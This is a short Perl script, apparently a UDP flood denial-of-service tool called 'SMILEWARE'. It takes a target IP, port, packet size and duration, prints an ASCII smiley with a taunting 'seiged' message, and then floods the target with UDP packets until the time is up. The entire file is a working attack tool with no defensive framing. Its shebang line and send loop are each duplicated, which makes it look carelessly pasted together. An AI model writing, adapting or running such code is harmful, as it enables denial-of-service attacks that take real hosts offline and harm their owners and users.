#!/usr/bin/perl

##
#!/usr/bin/perl

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);


print <<EOTEXT;
                   __ooooooooo__
               oOOOOOOOOOOOOOOOOOOOOOo        
           oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
        oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
      oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
    oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo   
   oOOOOOOOOOOO*  *OOOOOOOOOOOOOO*  *OOOOOOOOOOOOo
  oOOOOOOOOOOO      OOOOOOOOOOOO      OOOOOOOOOOOOo
  oOOOOOOOOOOOOo  oOOOOOOOOOOOOOOo  oOOOOOOOOOOOOOo
 oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
 oOOOO     OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO     OOOOo
 oOOOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOOOo
  *OOOOO  OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO  OOOOO*
 *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
   *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
   *OOOOOOo  *OOOOOOOOOOOOOOOOOOOOOOO*  oOOOOOO*
      *OOOOOOOo  *OOOOOOOOOOOOOOOOO*  oOOOOOOO*
        *OOOOOOOOo  *OOOOOOOOOOO*  oOOOOOOOO*      
           *OOOOOOOOo           oOOOOOOOO*      
              *OOOOOOOOOOOOOOOOOOOOO*          
                   ""ooooooooo"" 
				   
EOTEXT

print "SMILEWARE has seiged: $ip " . ($port ? $port : "random") . " With " .
($size ? "$size-byte" : "Extra Packets?") . " " .
($time ? "for $time seconds" : "") . "\n";

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}